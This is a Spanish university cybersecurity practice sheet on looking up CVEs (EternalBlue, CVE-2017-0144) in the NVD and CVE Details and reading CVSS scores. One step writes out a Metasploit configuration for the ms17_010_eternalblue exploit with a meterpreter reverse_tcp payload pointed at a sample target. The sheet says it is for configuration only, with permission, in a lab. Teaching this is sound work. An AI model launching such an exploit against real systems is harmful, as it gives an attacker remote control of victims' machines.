---
asignatura: Ciberseguridad
fecha: 2026-09-29
tema: Práctica de la Clase 3 · ponle nombre y nota a un fallo (NVD y CVE Details)
fuente: CIBER_Clase03_Practica.md
---
# Ciber · Práctica Clase 3 · CVE en el NVD y CVE Details

> Relacionado: [Clase 3](2026-09-29_clase3-donde-falla-un-sistema.md)

No se entrega ni puntúa; vale para coger mano con la **Actividad 2**. Se hace con el navegador.

1. **De dónde sale la versión**: `nmap -sV scanme.nmap.org` (ej. Apache 2.4.7, OpenSSH 6.6).
2. **Fallo estrella**: en nvd.nist.gov buscar **CVE-2017-0144** (EternalBlue, WannaCry). Apuntar: identificador, CVSS y nivel (Critical/High/Medium/Low), una línea de qué permite y a qué producto afecta.
3. **Por producto** en cvedetails.com: elegir fabricante/producto (Apache, WordPress), buscar la versión del paso 1 (Apache 2.4.7), ordenar por CVSS, abrir uno de los más graves y apuntar CVE y CVSS. *Una versión vieja es una lista de fallos con nombre.*
4. **Entender la nota**: CVSS 0–10, se calcula con fórmula; mirar el vector (`AV:N/AC:L/...`: ¿por red? ¿hace falta contraseña?). Calculadora v3 del NVD: cambiar una opción y ver cómo varía.
5. **Colocarlo**: ¿qué ataca (hardware, software o datos)? ¿qué amenaza lo aprovecha (externa por red, interna, descuido)?
   **Captura**: la ficha del CVE del paso 3 con su nota visible.
6. **De la ficha al exploit** (juntos en clase): Metasploit, solo configurar, no lanzar:
```bash
msfconsole
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.15      # objetivo de ejemplo, con permiso
set LHOST 10.0.0.9        # tu Kali
set PAYLOAD windows/x64/meterpreter/reverse_tcp
show options
```
Lanzarlo de verdad: **Clase 23**, con permiso y en laboratorio.

## Para saber más
Exploit-DB · Zerodium · Zero Day Initiative (Pwn2Own) · CCN-CERT · INCIBE-CERT (además asigna CVE).

## Regla del módulo
Solo scanme.nmap.org o tu red/máquina. NVD y CVE Details son webs públicas. Lo demás puede ser delito (arts. 197 y 264).

## Para el foro
Dos servidores con el mismo CVE, uno en internet y otro en red interna sin salida: ¿mismo riesgo? ¿Por qué la vulnerabilidad es la misma y el riesgo no?
*(Respuesta alineada con la Clase 3: el riesgo = vulnerabilidad + amenaza que pueda alcanzarla + daño; la exposición cambia la amenaza.)*
